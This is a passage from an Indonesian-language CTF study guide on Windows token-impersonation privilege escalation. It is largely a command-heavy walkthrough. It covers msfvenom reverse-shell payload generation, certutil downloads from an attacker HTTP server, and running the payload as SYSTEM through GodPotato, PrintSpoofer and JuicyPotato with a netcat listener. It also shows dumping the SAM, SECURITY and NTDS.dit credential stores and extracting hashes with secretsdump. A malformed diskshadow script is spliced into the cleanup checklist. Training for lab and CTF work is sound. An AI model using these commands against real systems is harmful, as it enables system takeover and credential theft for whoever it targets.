Incognito
=
enumerate/impersonate token yang sudah tersedia
```

---

# 8.2 🚀 Meterpreter Payload

Attacker:

```bash
# Buat test payload untuk lab
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$PARROT_IP \
  LPORT=$LPORT \
  -f exe \
  -o meter.exe
```

---

# 8.2.1 🎧 Handler

```bash
# Start Metasploit
msfconsole -q
```

Kemudian:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $PARROT_IP
set LPORT $LPORT
run
```

---

# 8.3 🔍 Incognito

```text
meterpreter > load incognito
```

List:

```text
meterpreter > list_tokens -u
```

```text
meterpreter > list_tokens -g
```

---

# 8.3.1 🎭 Impersonate

```text
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

Verify:

```text
meterpreter > getuid
```

Expected:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

# 8.3.2 🔄 Spawn Shell

```text
meterpreter > shell
```

Kemudian:

```cmd
whoami
```

---

# 8.4 🧨 getsystem

Meterpreter juga menyediakan:

```text
meterpreter > getsystem
```

Tool akan mencoba sejumlah teknik internal.

Namun untuk pembelajaran:

```text
Jangan hanya:
getsystem
→ SYSTEM
```

Pahami:

```text
getsystem
=
automation

Incognito
=
token manipulation

Potato
=
SeImpersonate exploitation
```

---

# 🎯 BAGIAN 9 — SEIMPERSONATEPRIVILEGE: MANUAL CONCEPT

# 9.1 🧠 Apa yang Terjadi Secara Manual?

Secara konseptual, token impersonation membutuhkan beberapa komponen:

```text
1. Client connection
2. Obtain client token
3. Impersonate token
4. Create/use process under token
```

Windows menyediakan API seperti:

```text
ImpersonateLoggedOnUser()
ImpersonateNamedPipeClient()
DuplicateTokenEx()
CreateProcessWithTokenW()
CreateProcessAsUser()
```

---

# 9.2 🔌 Named Pipe API Flow

Konsep:

```text
CreateNamedPipe()
       │
       ▼
ConnectNamedPipe()
       │
       ▼
Client connects
       │
       ▼
ImpersonateNamedPipeClient()
       │
       ▼
Get token
       │
       ▼
DuplicateTokenEx()
       │
       ▼
CreateProcess...
```

PrintSpoofer research secara eksplisit menjelaskan penggunaan `CreateNamedPipe`, `ConnectNamedPipe`, dan `ImpersonateNamedPipeClient` sebagai bagian dari mekanisme token impersonation.

---

# 9.3 🧪 PowerShell/C# Concept Skeleton

Contoh edukasi:

```powershell
# Source code minimal untuk menunjukkan
# bahwa Windows menyediakan API impersonation.
$Source = @"
using System;
using System.Runtime.InteropServices;

public class TokenDemo
{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Tambahkan tipe ke PowerShell
Add-Type $Source
```

### Tujuan contoh

Bukan:

```text
"Ini sudah menjadi Potato."
```

Tetapi:

```text
"Windows memang menyediakan API
untuk bekerja dengan token."
```

---

# 9.4 🧠 Kenapa Potato Works?

Karena ada trust model:

```text
SERVICE
  │
  │ "Saya boleh impersonate client"
  ▼
CLIENT CONNECTION
  │
  ▼
CLIENT TOKEN
```

Masalah muncul ketika attacker berhasil membuat:

```text
SYSTEM
```

menjadi client yang connect ke resource yang attacker kontrol.

Lalu:

```text
SeImpersonatePrivilege
        +
SYSTEM client token
        ↓
impersonate
        ↓
SYSTEM
```

Ini adalah inti seluruh family.

---

# 🌐 BAGIAN 10 — SKENARIO CTF UMUM

# 10.1 🌐 Scenario A — IIS AppPool

```text
WEB RCE
  │
  ▼
IIS worker process
  │
  ▼
whoami
  │
  ▼
iis apppool\defaultapppool
```

Cek:

```cmd
:: Current identity
whoami
```

Output:

```text
iis apppool\defaultapppool
```

Lanjut:

```cmd
:: Check privileges
whoami /priv
```

Output:

```text
SeImpersonatePrivilege    Enabled
```

Decision:

```text
IIS AppPool
   ↓
SeImpersonate
   ↓
Potato candidate
```

---

# 10.2 🗄️ Scenario B — SQL Server

Misalnya:

```text
xp_cmdshell
   ↓
NT SERVICE\MSSQLSERVER
```

Check:

```cmd
:: Identify account
whoami

:: Check privileges
whoami /priv
```

Jika:

```text
SeImpersonatePrivilege
```

tersedia:

```text
SQL service
   ↓
SeImpersonate
   ↓
GodPotato/PrintSpoofer candidate
```

---

# 10.3 🏗️ Scenario C — Jenkins/Tomcat

```text
Remote Code Execution
        │
        ▼
Service account
        │
        ▼
whoami /priv
```

Jika:

```text
SeImpersonate
```

gunakan decision tree:

```text
Windows version
       │
       ├── old
       │    └── JuicyPotato candidate
       │
       └── modern
            ├── PrintSpoofer candidate
            ├── GodPotato candidate
            └── other potato variants
```

---

# 10.4 🌳 Scenario D — No SeImpersonate

Misalnya:

```cmd
C:\> whoami /priv
```

dan output:

```text
SeImpersonatePrivilege
    tidak ada
```

Jangan:

```text
"Potato tidak works → selesai."
```

Kembali ke:

```text
FILE 45
```

Cari:

```text
Unquoted service path
Weak service ACL
Scheduled tasks
Registry abuse
AlwaysInstallElevated
Unquoted path
Credential reuse
DLL hijacking
PATH hijacking
SeBackup
SeDebug
SeTakeOwnership
```

---

# 🧠 BAGIAN 11 — SEDEBUGPRIVILEGE
### SeDebugPrivilege – Concrete Tool
```powershell
# ============================================
# SEDEBUGPRIVILEGE — TOOL KONKRET
# ============================================

# Tool: psgetsys.ps1 (from decoder‑it)
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

# Upload to target (same as other tools)
# python3 -m http.server 8000
# On target:
certutil -urlcache -split -f http://$PARROT_IP:8000/psgetsys.ps1 C:\\Windows\\Temp\\pgs.ps1

# Usage on target:
Get-Process | Where-Object {$_.Name -eq "winlogon"} | Select-Object Id
. C:\\Windows\\Temp\\pgs.ps1
ImpersonateFromParentPid -ppid <PID> -command "C:\\Windows\\Temp\\shell.exe" -cmdargs ""
```

# 11.1 🔍 Apa itu SeDebugPrivilege?

`SeDebugPrivilege` memungkinkan akun tertentu melakukan operasi debug terhadap process lain yang biasanya berada di security context berbeda, subject to Windows security checks.

Mental model:

```text
Normal user
   ↓
cannot freely open SYSTEM process

SeDebug
   ↓
lebih banyak access
   ↓
potential token/process abuse
```

---

# 11.2 🔎 Check

```cmd
:: Check debug privilege
whoami /priv | findstr /i "SeDebugPrivilege"
```

---

# 11.3 🧪 Enumerate Processes

```powershell
# List process dan PID
Get-Process |
    Select-Object Name, Id
```

Filter process SYSTEM:

```powershell
# Tampilkan process tertentu
Get-Process |
    Where-Object {$_.Name -match "winlogon|lsass|services|wininit"} |
    Select-Object Name, Id
```

### ⚠️ Jangan menganggap:

```text
SeDebugPrivilege
+
winlogon PID
=
automatic SYSTEM
```

Masih diperlukan:

```text
token handling
process access
correct API
architecture compatibility
protection mechanisms
```

---

# 🔧 BAGIAN 12 — SEBACKUP & SERESTORE

# 12.1 💾 SeBackupPrivilege

SeBackup dapat memungkinkan operasi baca menggunakan backup semantics yang melewati sebagian normal ACL restrictions.

Impact potensial:

```text
Protected files
    ↓
SAM
SYSTEM hive
SECURITY hive
NTDS.dit
    ↓
credential extraction
```

---

# 12.2 🔎 Check

```cmd
:: Check backup privilege
whoami /priv | findstr /i "SeBackupPrivilege"
```

---

# 12.3 💥 SAM/SYSTEM Dump

Dalam lab:

```cmd
:: Save registry hives
reg save HKLM\SAM C:\Windows\Temp\SAM.hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive
```

Kemudian transfer ke attacker.

---

# 12.4 🐍 secretsdump

Attacker:

```bash
# Extract local account hashes
python3 /opt/impacket/examples/secretsdump.py \
  -sam SAM.hive \
  -security SECURITY.hive \
  -system SYSTEM.hive \
  LOCAL
```

Contoh output:

```text
[*] Target system bootKey: ...
[*] Dumping local SAM hashes
Administrator:500:LMHASH:NTHASH:::
Guest:501:LMHASH:NTHASH:::
```

---

# 12.5 🏢 Domain Controller — NTDS

Pada DC, `NTDS.dit` adalah database Active Directory.

Concept:

```text
SeBackup
   ↓
protected database access
   ↓
NTDS.dit
   +
SYSTEM key material
   ↓
credential extraction
```

Dalam lab, workflow dapat menggunakan:

```text
DiskShadow
+
shadow copy
+
robocopy / backup semantics
+
secretsdump
```

Contoh konsep:

```powershell
# Buat command file untuk shadow copy
@"
set context persistent nowriters
add volume c: alias sysvol
create
expose %sysvol% x:
"@ | Out-File C:\Windows\Temp\shadow.txt -Encoding ascii
```

Jalankan:

```cmd
:: Create shadow copy
diskshadow /s C:\Windows\Temp\shadow.txt
```

Kemudian:

```cmd
:: Copy NTDS database dari shadow volume
robocopy /b X:\Windows\NTDS C:\Windows\Temp NTDS.dit
```

Save SYSTEM:

```cmd
:: Save SYSTEM hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

Attacker:

```bash
# Extract directory hashes in lab
python3 /opt/impacket/examples/secretsdump.py \
  -ntds NTDS.dit \
  -system SYSTEM.hive \
  LOCAL
```

---

# ♻️ BAGIAN 13 — SETAKEOWNERSHIPPRIVILEGE

# 13.1 🧠 Konsep

```text
SeTakeOwnershipPrivilege
        ↓
take ownership
        ↓
change security descriptor / ACL
        ↓
access protected object
```

Penting:

```text
Take ownership
≠ automatically full permissions
```

Biasanya perlu kombinasi:

```text
take ownership
+
grant suitable ACL
```

---

# 13.2 🔎 Check

```cmd
:: Check privilege
whoami /priv | findstr /i "SeTakeOwnershipPrivilege"
```

---

# 13.3 💥 Basic Example

```cmd
:: Ambil ownership file
takeown /f C:\Temp\Protected.txt

:: Setelah ownership,
:: berikan full control ke current user
icacls C:\Temp\Protected.txt /grant %USERNAME%:F
```

Kemudian:

```cmd
:: Test access
type C:\Temp\Protected.txt
```

---

# 13.4 ⚠️ Accessibility Binary Replacement

Teknik mengganti binary Windows penting seperti `Utilman.exe` adalah persistence/abuse scenario yang berisiko dan sangat tergantung pada build, file protection, recovery state, dan hardening.

Dalam CTF:

```text
SeTakeOwnership
 ↓
ownership
 ↓
ACL
 ↓
protected binary manipulation
```

lebih penting dipahami sebagai chain daripada menghafal satu command.

---

# 🏆 BAGIAN 14 — MASTER COMPARISON TABLE

|Technique|Privilege|Typical OS Context|Tool|Complexity|CTF Frequency|
|---|---|---|---|---|---|
|JuicyPotato|`SeImpersonate` / related|Older Windows|JuicyPotato|🟢 Low|🔥 High|
|PrintSpoofer|`SeImpersonate`|Windows 10 / Server 2019 class systems|PrintSpoofer|🟢 Low|🔥 High|
|RoguePotato|`SeImpersonate`|Modern/Server environments|RoguePotato|🟠 Medium|🟠 Medium|
|GodPotato|`SeImpersonate`|Broad modern Windows coverage|GodPotato|🟢 Low|🔥 High|
|SweetPotato|`SeImpersonate`|Various Windows environments|SweetPotato|🟠 Medium|🟠 Medium|
|Incognito|Existing tokens|Meterpreter context|Meterpreter|🟢 Low|🟠 Medium|
|SeDebug abuse|`SeDebugPrivilege`|Admin/service context|Native/custom tools|🔴 High|🟡 Low|
|SAM dump|`SeBackupPrivilege` / appropriate access|Local machine|`reg`, secretsdump|🟠 Medium|🟠 Medium|
|NTDS extraction|Backup-level access on DC|Domain Controller|DiskShadow/secretsdump|🔴 High|🟡 Low|
|Ownership abuse|`SeTakeOwnershipPrivilege`|Windows|takeown/icacls|🟠 Medium|🟠 Medium|

---

# 🧪 BAGIAN 15 — FULL CTF WALKTHROUGH

# 15.1 🎯 Scenario

Target:

```text
Windows Server 2019
```

Foothold:

```text
Web RCE
```

Current account:

```text
IIS APPPOOL\DefaultAppPool
```

---

## STEP 1 — Identity

```cmd
:: Cek identity
whoami
```

Output:

```text
iis apppool\defaultapppool
```

---

## STEP 2 — Privileges

```cmd
:: Check privileges
whoami /priv
```

Output:

```text
SeChangeNotifyPrivilege      Enabled
SeImpersonatePrivilege       Enabled
SeCreateGlobalPrivilege      Enabled
```

Decision:

```text
SeImpersonate
        │
        ▼
Potato attack candidate
```

---

# STEP 3 — OS

```cmd
:: Identify OS
systeminfo | findstr /i "OS Name"

:: Identify build
systeminfo | findstr /i "OS Version"
```

Output:

```text
OS Name:    Microsoft Windows Server 2019 Standard
OS Version: 10.0.17763 N/A Build 17763
```

---

# STEP 4 — Choose Tool

```text
Server 2019
     │
     ├── JuicyPotato
     │      ↓
     │   not first choice
     │
     ├── PrintSpoofer
     │      ↓
     │   strong candidate
     │
     └── GodPotato
            ↓
         strong candidate
```

PrintSpoofer was specifically researched for Server 2019 scenarios with `SeImpersonatePrivilege`.

---

# STEP 5 — Upload Tool

Attacker:

```bash
# Serve tools
cd /opt/tools
python3 -m http.server 8000
```

Target:

```cmd
:: Download GodPotato
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/GodPotato-NET4.exe ^
  C:\Windows\Temp\gp.exe
```

Verify:

```cmd
:: Confirm binary
dir C:\Windows\Temp\gp.exe
```

---

# STEP 6 — VALIDATE BEFORE REVERSE SHELL

Ini langkah yang sangat penting.

```cmd
:: Test direct command execution
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
```

Jika:

```text
nt authority\system
```

berarti:

```text
Token impersonation succeeded.
```

---

# STEP 7 — Prepare Payload

Attacker:

```bash
# Set variables
export TARGET="10.10.10.X"
export PARROT_IP="10.10.14.X"
export LPORT="4444"
```

Generate lab payload:

```bash
# Generate Windows reverse shell executable
msfvenom \
  -p windows/x64/shell_reverse_tcp \
  LHOST=$PARROT_IP \
  LPORT=$LPORT \
  -f exe \
  -o shell.exe
```

Serve:

```bash
# Serve payload
python3 -m http.server 8000
```

---

# STEP 8 — Upload Payload

Target:

```cmd
:: Download payload
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/shell.exe ^
  C:\Windows\Temp\shell.exe
```

Verify:

```cmd
:: Confirm
dir C:\Windows\Temp\shell.exe
```

---

# STEP 9 — Listener

Attacker:

```bash
# Start listener BEFORE exploit
rlwrap nc -lvnp $LPORT
```

---

# STEP 10 — Execute via GodPotato

Target:

```cmd
:: Execute payload under elevated token context
C:\Windows\Temp\gp.exe ^
  -cmd "C:\Windows\Temp\shell.exe"
```

---

# STEP 11 — Verify

Listener:

```cmd
:: Confirm current identity
whoami
```

Expected:

```text
nt authority\system
```

Then:

```cmd
:: Confirm UID-equivalent security context
whoami /groups
```

---

# STEP 12 — Root Flag

HTB/CTF Windows convention:

```cmd
:: Search for likely root/admin flag
dir C:\Users\Administrator\Desktop
```

Read:

```cmd
:: Read flag
type C:\Users\Administrator\Desktop\root.txt
```

---

# 🧠 BAGIAN 16 — TROUBLESHOOTING

|Error / Situation|Kemungkinan Penyebab|Solusi|
|---|---|---|
|`Access is denied` saat run tool|Directory/ACL/WDAC/AppLocker|Pindah ke writable directory dan cek policy|
|Tool tidak jalan sama sekali|Architecture mismatch|Pastikan x64/x86 sesuai|
|`SeImpersonate` tidak ada|Account tidak punya privilege|Kembali ke File 45|
|`SeImpersonate` Disabled|Privilege ada tapi inactive|Validasi apakah tool dapat menggunakan/enable privilege|
|JuicyPotato gagal|Windows 10 1809+/Server 2019+|Gunakan teknik modern|
|JuicyPotato `authresult -1`|CLSID/environment issue|Ganti CLSID sesuai target|
|PrintSpoofer timeout|Service/environment tidak cocok|Cek service, privilege, build|
|PrintSpoofer tidak interactive|Console/session limitation|Gunakan non-interactive `-c` command|
|GodPotato tidak execute|.NET/runtime mismatch|Pilih binary runtime yang sesuai|
|GodPotato command error|Quote/path issue|Test `whoami` sederhana dahulu|
|Reverse shell tidak masuk|Firewall/outbound block|Test local `whoami > file`|
|`certutil` gagal|Binary blocked / network|Pakai transfer method lain yang tersedia|
|HTTP server tidak reachable|Routing/network|Test `curl`/`ping` bila tersedia|
|nc listener tidak menerima|Wrong LHOST/LPORT|Verifikasi IP attacker|
|`whoami` tetap service account|Token abuse gagal|Ganti tool/technique|
|Incognito tidak menemukan SYSTEM token|Token belum tersedia|Enumeration lain / service state|
|SeDebug belum menghasilkan SYSTEM|Process access saja belum cukup|Gunakan token/process technique yang tepat|
|`reg save` gagal|Privilege/context tidak cukup|Verifikasi `SeBackupPrivilege`/access|
|`robocopy /b` gagal|Backup semantics/environment|Validasi privilege dan path|
|NTDS extraction gagal|Bukan DC / wrong hive|Verifikasi DC dan SYSTEM key|
|Takeown berhasil tetapi file belum bisa dibaca|Ownership ≠ ACL|Gunakan ACL adjustment yang sesuai|

---

# 🪜 BAGIAN 17 — GOLDEN RULES TOKEN IMPERSONATION

## Rule 01 — 🔍 Cek privilege dulu

```cmd
:: First command
whoami /priv
```

---

## Rule 02 — 🪟 Cek Windows build

```cmd
:: Identify OS
systeminfo | findstr /i "OS Name"

:: Identify version
systeminfo | findstr /i "OS Version"
```

Jangan pilih tool sebelum tahu target.

---

## Rule 03 — 🎫 `SeImpersonatePrivilege` adalah red flag besar

```text
service account
+
SeImpersonatePrivilege
=
STOP dan investigate
```

---

## Rule 04 — 🟡 Disabled bukan sama dengan absent

```text
Disabled
=
present but inactive

Absent
=
not in token
```

Tetap test apakah tool dapat memanfaatkan privilege tersebut.

---

## Rule 05 — 📂 Gunakan writable directory

Candidate umum:

```text
C:\Windows\Temp
C:\ProgramData
C:\Users\Public
```

Cek dahulu:

```cmd
:: Test write
echo test > C:\Windows\Temp\write_test.txt
```

---

## Rule 06 — 🎧 Listener sebelum reverse shell

Jangan:

```text
run exploit
 ↓
baru start listener
```

Lakukan:

```text
listener
 ↓
payload ready
 ↓
exploit
```

---

## Rule 07 — 🧪 Validate local command dulu

Sebelum reverse shell:

```cmd
:: Minimal validation
whoami
```

Lebih baik:

```cmd
:: Tool validation
gp.exe -cmd "cmd /c whoami"
```

Jika:

```text
SYSTEM
```

baru lanjut.

---

## Rule 08 — 🧩 Tool selection berdasarkan environment

```text
OLD WINDOWS
    ↓
JuicyPotato candidate

MODERN WINDOWS
    ↓
PrintSpoofer / GodPotato / alternatives
```

Bukan:

```text
GodPotato always
```

---

## Rule 09 — 🔬 Jangan anggap nama tool = guarantee

```text
GodPotato
PrintSpoofer
JuicyPotato
```

semuanya dapat gagal karena:

```text
build
service state
mitigation
.NET runtime
architecture
network
token state
```

---

## Rule 10 — ✅ Verifikasi dengan `whoami`

Jangan menganggap shell baru:

```text
C:\Windows\System32>
```

berarti SYSTEM.

Gunakan:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

---

## Rule 11 — 🧹 Cleanup

Setelah CTF selesai:

```cmd
:: Hapus tools
del C:\Windows\Temp\gp.exe
del C:\Windows\Temp\PS.exe
del C:\Windows\Temp\JP.exe

:: Hapus payload
del C:\Windows\Temp\shell.exe

:: Hapus temporary output
del C:\Windows\Temp\gp-result.txt
del C:\Windows\Temp\who.txt
```

---

## Rule 12 — 🧠 Understand the primitive

Jangan hanya hafal:

```text
gp.exe -cmd ...
```

Pahami:

```text
SeImpersonate
       ↓
Privileged client authentication
       ↓
Token acquisition
       ↓
Impersonation
       ↓
Process creation
       ↓
SYSTEM
```

---

# ⚡ BAGIAN 18 — QUICK REFERENCE CHEATSHEET

## 🟣 Attacker Setup

```bash
# Set target
export TARGET="10.10.10.X"

# Set attacker IP
export PARROT_IP="10.10.14.X"

# Set listener port
export LPORT="4444"
```

---

## 🌐 HTTP Server

```bash
# Serve current directory
python3 -m http.server 8000
```

---

## 🎧 Listener

```bash
# Start listener
rlwrap nc -lvnp $LPORT
```

---

## 🪪 Windows Enumeration

```cmd
:: Current user
whoami

:: Current privileges
whoami /priv

:: Current token/groups
whoami /all

:: Groups only
whoami /groups

:: Windows version
systeminfo | findstr /i "OS Name"

:: Windows build
systeminfo | findstr /i "OS Version"

:: Architecture
echo %PROCESSOR_ARCHITECTURE%
```

---

## 🚩 Check SeImpersonate

```cmd
:: Search for token impersonation privilege
whoami /priv | findstr /i "SeImpersonate"
```

---

## 📥 Transfer

```cmd
:: Download file
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/tool.exe ^
  C:\Windows\Temp\tool.exe
```

---

## 👑 GodPotato

```cmd
:: First test with whoami
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
```

Expected:

```text
nt authority\system
```

Then:

```cmd
:: Execute payload
C:\Windows\Temp\gp.exe ^
  -cmd "C:\Windows\Temp\shell.exe"
```

---

## 🖨️ PrintSpoofer

```cmd
:: Interactive shell
C:\Windows\Temp\PS.exe -i -c cmd
```

Or:

```cmd
:: Execute command
C:\Windows\Temp\PS.exe ^
  -c "cmd.exe /c whoami > C:\Windows\Temp\ps.txt"
```

---

## 🥔 JuicyPotato

```cmd
:: Historical/legacy Windows candidate
C:\Windows\Temp\JP.exe ^
  -l 1337 ^
  -p C:\Windows\Temp\shell.exe ^
  -t * ^
  -c {CLSID}
```

---

## 🎭 Incognito

```text
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > list_tokens -g
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
```

---

## 💾 Backup Privilege

```cmd
:: Check
whoami /priv | findstr /i "SeBackupPrivilege"

:: Save SAM hive
reg save HKLM\SAM C:\Windows\Temp\SAM.hive

:: Save SYSTEM hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive

:: Save SECURITY hive
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive
```

Attacker:

```bash
# Extract local hashes
python3 /opt/impacket/examples/secretsdump.py \
  -sam SAM.hive \
  -security SECURITY.hive \
  -system SYSTEM.hive \
  LOCAL
```

---

# 🌳 BAGIAN 19 — MASTER DECISION TREE 30 DETIK

```text
                [LOW PRIV SHELL]
                       │
                       ▼
                 [whoami /priv]
                       │
        ┌──────────────┼──────────────┐
        │              │              │
        ▼              ▼              ▼
   SeImpersonate   SeAssignPrimary   SeDebug
        │              │              │
        ▼              ▼              ▼
      POTATO       TOKEN ABUSE      DEBUG
        │
        ▼
 [CHECK WINDOWS BUILD]
        │
   ┌────┴───────────┐
   │                │
   ▼                ▼
 OLD OS          MODERN OS
   │                │
   ▼                ├── PrintSpoofer
JuicyPotato         ├── GodPotato
   │                ├── RoguePotato
   │                └── SweetPotato
   │
   └────────┬───────┘
            │
            ▼
      [VALIDATE WHOAMI]
            │
       ┌────┴────┐
       │         │
       ▼         ▼
     SYSTEM    NOT SYSTEM
       │         │
       ▼         ▼
      FLAG   TRY NEXT TOOL
                 │
                 ▼
            [SEBACKUP?]
                 │
                 ▼
            SAM / NTDS
                 │
                 ▼
          [SEDEBUG?]
                 │
                 ▼
            PROCESS/TOKEN
                 │
                 ▼
         [SETAKEOWNERSHIP?]
                 │
                 ▼
             OWNERSHIP
                 │
                 ▼
              FILE 45
```

---

# 🧠 BAGIAN 20 — MASTER MENTAL MODEL

Saat melihat:

```text
NT AUTHORITY\LOCAL SERVICE
```

jangan berhenti.

Pikir:

```text
LOCAL SERVICE
      │
      ▼
whoami /priv
      │
      ▼
SeImpersonate?
      │
  ┌───┴───┐
  │       │
 YES      NO
  │       │
  ▼       ▼
Potato   File 45
  │
  ▼
Windows build?
  │
  ├── Old
  │    └── JuicyPotato
  │
  └── Modern
       ├── PrintSpoofer
       ├── GodPotato
       ├── RoguePotato
       └── SweetPotato
```

---

# 🧬 TOKEN IMPERSONATION PRIMITIVE

Semua workflow ini dapat dipadatkan menjadi:

```text
[LOW PRIV SERVICE]
       │
       │ has
       ▼
[SeImpersonatePrivilege]
       │
       │ attacker creates
       ▼
[CONTROLLED IPC / RPC CONTEXT]
       │
       │ privileged client connects
       ▼
[SYSTEM CLIENT TOKEN]
       │
       │ impersonate
       ▼
[IMPERSONATED SYSTEM TOKEN]
       │
       │ process creation
       ▼
[NT AUTHORITY\SYSTEM]
```

---

# 🔗 BAGIAN 21 — CROSS-WORKFLOW LINKS

## ← File 45 — Windows Privilege Escalation

```text
./[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)
```

File 45 adalah overview.

File 46 adalah:

```text
DEEP DIVE
    ↓
ACCESS TOKEN
    ↓
IMPERSONATION
    ↓
POTATO FAMILY
```

---

## → File 47 — Sudo, SUID & Capabilities

```text
./[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
```

Perbandingan konsep:

```text
Windows
SeImpersonate
    ↓
Token Abuse

Linux
sudo / SUID / capabilities
    ↓
Privilege Abuse
```

Primitive berbeda, tetapi mindset sama:

```text
What privilege do I have?
        ↓
What does the system trust?
        ↓
What can I control?
        ↓
Can I cross the privilege boundary?
```

---

## ← File 44 — Linux PrivEsc

```text
./[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

Keduanya memiliki workflow:

```text
FOOTHOLD
 ↓
STABILIZE
 ↓
ENUMERATE
 ↓
IDENTIFY PRIVILEGE
 ↓
VALIDATE
 ↓
EXPLOIT
 ↓
VERIFY
```

---

## → File 35 — AD Initial Enumeration

```text
./[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)
```

Setelah menjadi:

```text
NT AUTHORITY\SYSTEM
```

pada domain-joined machine:

```text
SYSTEM
  ↓
Credential / token / local artifact discovery
  ↓
AD enumeration
  ↓
lateral movement
```

---

## → File 41 — NTLM Relay

```text
./[🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay)
```

Token escalation dan NTLM relay adalah dua topik berbeda:

```text
Token Impersonation
=
local privilege escalation

NTLM Relay
=
authentication forwarding / relay
```

Namun keduanya dapat muncul dalam satu attack chain.

---

# 🏁 BAGIAN 22 — FINAL CTF CHECKLIST

```text
╔═══════════════════════════════════════════════════╗
║       TOKEN IMPERSONATION MASTER CHECKLIST       ║
╚═══════════════════════════════════════════════════╝
```

## 🎫 TOKEN

```text
[ ] whoami
[ ] whoami /all
[ ] whoami /groups
[ ] whoami /priv
[ ] Integrity level diperiksa
[ ] SeImpersonate dicari
[ ] SeAssignPrimaryToken dicari
[ ] SeDebug dicari
[ ] SeBackup dicari
[ ] SeRestore dicari
[ ] SeTakeOwnership dicari
```

## 🪟 WINDOWS

```text
[ ] OS Name
[ ] OS Version
[ ] Build number
[ ] Architecture
[ ] Service account
[ ] .NET runtime
[ ] Print Spooler state
```

## 🥔 POTATO

```text
[ ] SeImpersonate tersedia?
[ ] Windows old atau modern?
[ ] JuicyPotato sesuai?
[ ] PrintSpoofer sesuai?
[ ] GodPotato sesuai?
[ ] RoguePotato diperlukan?
[ ] SweetPotato diperlukan?
[ ] Binary architecture benar?
[ ] Runtime/.NET cocok?
```

## 🧪 VALIDATION

```text
[ ] Test local command dulu
[ ] whoami berhasil
[ ] output menunjukkan SYSTEM
[ ] Reverse shell baru digunakan setelah validasi
```

## 🎧 NETWORK

```text
[ ] LHOST benar
[ ] LPORT benar
[ ] Listener aktif
[ ] Outbound connection memungkinkan
[ ] Firewall diperiksa bila perlu
```

## 🧹 CLEANUP

```text
[ ] Tool dihapus
[ ] Payload dihapus
[ ] Temporary files dihapus
[ ] Listener dihentikan
[ ] Tidak ada unnecessary persistence
# Additional cleanup commands
certutil -urlcache -split -f http://$PARROT_IP:8000/GodPotato-NET4.exe delete
certutil -urlcache -split -f http://$PARROT_IP:8000/shell.exe delete
# (Optional) Remove shadow copy if created
diskshadow /s C:\\Windows\\Temp\\cleanup.txt

# Improved diskshadow script (Section 12.5)
$shadowScript = @"\
set verbose on\
set metadata C:\\Windows\\Temp\\meta.cab\
set context clientaccessible\
set context persistent\
begin backup\
add volume c: alias cdrive\
create\
expose %cdrive% x:\
end backup\
"@
$shadowScript | Out-File -FilePath C:\\Windows\\Temp\\shadow.txt -Encoding ASCII

diskshadow /s C:\\Windows\\Temp\\shadow.txt
```

---

# ⭐ BAGIAN 23 — THE ONE-LINE MEMORY

```text
SHELL → whoami /priv → SeImpersonate? → WINDOWS BUILD → CHOOSE POTATO → VALIDATE whoami → SYSTEM → FLAG
```

---

# 🧠 BAGIAN 24 — THE REAL SKILL

Jangan sampai skill Anda berhenti pada:

```text
"GodPotato command yang mana?"
```

Level pemahaman yang benar:

```text
Saya punya service account
        ↓
token saya memiliki SeImpersonatePrivilege
        ↓
Windows menyediakan impersonation mechanism
        ↓
privileged service dapat dipancing melakukan authentication
        ↓
saya memperoleh usable privileged token
        ↓
token tersebut dapat digunakan untuk process creation
        ↓
process berjalan sebagai SYSTEM
```

Dengan kata lain:

> **Token impersonation bukan sekadar Potato. Potato hanyalah salah satu implementasi praktis dari konsep token abuse Windows.**

---

# 🏆 FINAL RULE

Saat CTF memberi Anda:

```text
Web RCE
      ↓
Service Account
      ↓
whoami /priv
      ↓
SeImpersonatePrivilege
```

anggap itu sebagai:

```text
🚨 HIGH-VALUE FINDING 🚨
```

Lalu lakukan:

```text
1. Identify Windows build
2. Confirm privilege
3. Select compatible technique
4. Validate with `whoami`
5. Escalate to SYSTEM
6. Verify
7. Capture flag
8. Cleanup
```

Dan jangan pernah melewati langkah:

```text
VALIDATE
```

karena inti workflow yang benar bukan:

```text
"Jalankan exploit."
```

melainkan:

```text
"Temukan token yang bisa dipercaya sistem,
pahami kenapa kita boleh menggunakannya,
lalu buktikan bahwa privilege boundary
benar-benar berhasil dilewati."
```

---

# 📚 REFERENSI TEKNIS

- JuicyPotato project / CLSID database: `https://github.com/ohpe/juicy-potato`
    
- PrintSpoofer research: `https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/`
    
- GodPotato project: `https://github.com/BeichenDream/GodPotato`
    
- Microsoft Windows access token / impersonation APIs: dokumentasi Win32 API yang relevan seperti token, named pipe impersonation, dan process creation APIs.
    

---

# ✅ END STATE

```text
                         LOW PRIV SHELL
                              │
                              ▼
                         whoami /priv
                              │
                              ▼
                    SeImpersonatePrivilege?
                         │           │
                        YES          NO
                         │           │
                         ▼           ▼
                    Windows Build   File 45
                         │
              ┌──────────┴──────────┐
              │                     │
              ▼                     ▼
           OLD OS               MODERN OS
              │                     │
              ▼                     ├── PrintSpoofer
        JuicyPotato                ├── GodPotato
                                   ├── RoguePotato
